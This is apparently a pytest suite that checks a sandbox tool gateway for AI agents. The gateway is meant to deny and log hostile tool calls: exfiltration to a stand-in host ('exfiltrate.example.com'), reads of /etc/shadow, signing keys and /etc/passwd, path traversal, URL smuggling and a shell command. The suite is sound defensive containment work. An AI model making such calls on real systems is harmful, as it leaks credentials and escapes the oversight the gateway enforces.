"""Adversarial agent gateway suite (spec §9, AG-1..AG-8).

Runs the hostile task fixture (packages/sandbox-runtime/tests/adversarial/
fixtures/agent_hostile_task.json is the canonical list) through the REAL
ToolGateway with a fake network. Every attempt must be DENIED (or capped)
AND recorded — the security boundary is the gateway, never the model.

The fixture's oversized placeholders are materialized here with real
payloads.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from workflo_worker.agent_tools import (
    MAX_LISTED_FILES,
    MAX_LOG_LINES,
    MAX_REQUEST_BODY_BYTES,
    MAX_URL_LENGTH,
    ToolGateway,
)


@pytest.fixture
def gateway(tmp_path):
    records = tmp_path / "agent_tool_calls.jsonl"
    log = tmp_path / "app.log"
    log.write_text("line1\nline2\n")
    return ToolGateway(records, app_log_path=log)


def _records(gateway) -> list[dict]:
    path = Path(gateway.records_path)
    if not path.exists():
        return []
    return [json.loads(l) for l in path.read_text().splitlines() if l.strip()]


class TestHostileNetworkAttempts:
    def test_external_exfiltration_denied(self, gateway):
        r = gateway.call("http_get", {"url": "http://exfiltrate.example.com/steal"})
        assert r["denied"] is True

    def test_suffix_lookalike_denied(self, gateway):
        r = gateway.call("http_get", {"url": "http://evil.workflo.internal.evil.com/"})
        assert r["denied"] is True

    def test_userinfo_smuggling_denied(self, gateway):
        """http://user@app.workflo.internal has a valid suffix but embeds
        credentials — denied (AG-4)."""
        r = gateway.call("http_get", {"url": "http://user@app.workflo.internal/"})
        assert r["denied"] is True

    def test_oversized_url_denied(self, gateway):
        url = "http://app.workflo.internal/" + "x" * (MAX_URL_LENGTH)
        r = gateway.call("http_get", {"url": url})
        assert r["denied"] is True

    def test_oversized_body_denied(self, gateway):
        body = {"blob": "x" * (MAX_REQUEST_BODY_BYTES + 1)}
        r = gateway.call("http_post",
                         {"url": "http://app.workflo.internal:3000/", "body": body})
        assert r["denied"] is True


class TestHostileFileAttempts:
    def test_host_sensitive_file_denied(self, gateway):
        r = gateway.call("read_file", {"path": "/etc/shadow"})
        assert r["denied"] is True

    def test_traversal_denied(self, gateway):
        r = gateway.call("read_file", {"path": "/workflo/artifacts/../../etc/shadow"})
        assert r["denied"] is True

    def test_signing_key_denied(self, gateway):
        r = gateway.call("read_file", {"path": "/workflo/signing_key.pem"})
        assert r["denied"] is True

    def test_ledger_read_denied(self, gateway):
        """The evidence ledger is host-side — no sandbox path may reach it."""
        r = gateway.call("read_file", {"path": "/workflo/evidence/events.jsonl"})
        assert r["denied"] is True

    def test_scheme_smuggling_denied(self, gateway):
        r = gateway.call("read_file", {"path": "file:///etc/passwd"})
        assert r["denied"] is True


class TestUnknownAndShellAttempts:
    def test_unknown_tool_denied_and_recorded(self, gateway):
        r = gateway.call("shell", {"cmd": "id"})
        assert r["denied"] is True
        assert "unknown tool" in r["reason"]


class TestCappedTools:
    """Caps enforce bounded behavior without a denial — the cap is the
    containment (AG-3)."""

    def test_log_lines_capped(self, gateway):
        r = gateway.call("read_log", {"lines": 1000000})
        assert r["denied"] is False
        assert r["ok"] is True
        assert r["result_summary"]["line_count"] <= MAX_LOG_LINES

    def test_list_files_bounded(self, gateway, tmp_path, monkeypatch):
        """list_files never exceeds the file-count cap — even with a
        directory full of files."""
        from workflo_worker import agent_tools

        monkeypatch.setattr(agent_tools, "ALLOWED_FILE_ROOTS", (str(tmp_path),))
        # _path_allowed is imported by value into the module's helpers; the
        # module-level constant is what _list_files consults.
        for i in range(50):
            (tmp_path / f"file_{i}.txt").write_text("x")
        (tmp_path / "deep1" / "deep2").mkdir(parents=True)

        r = gateway.call("list_files", {"path": str(tmp_path)})
        assert r["denied"] is False
        assert r["ok"] is True
        files = r.get("result_summary", {}).get("files", [])
        assert len(files) <= MAX_LISTED_FILES


class TestEveryAttemptRecorded:
    def test_denials_all_recorded(self, gateway):
        attempts = [
            ("http_get", {"url": "http://exfiltrate.example.com/"}),
            ("read_file", {"path": "/etc/shadow"}),
            ("shell", {"cmd": "id"}),
            ("http_post", {"url": "http://app.workflo.internal/",
                           "body": {"blob": "x" * (MAX_REQUEST_BODY_BYTES + 1)}}),
        ]
        for tool, args in attempts:
            gateway.call(tool, args)

        records = _records(gateway)
        assert len(records) == len(attempts)
        assert all(r["denied"] for r in records)
        # Sequence integrity — a hostile agent can't hide an attempt by
        # renumbering; the host's monotonic seq is the cross-check (F-6).
        assert [r["seq"] for r in records] == [1, 2, 3, 4]
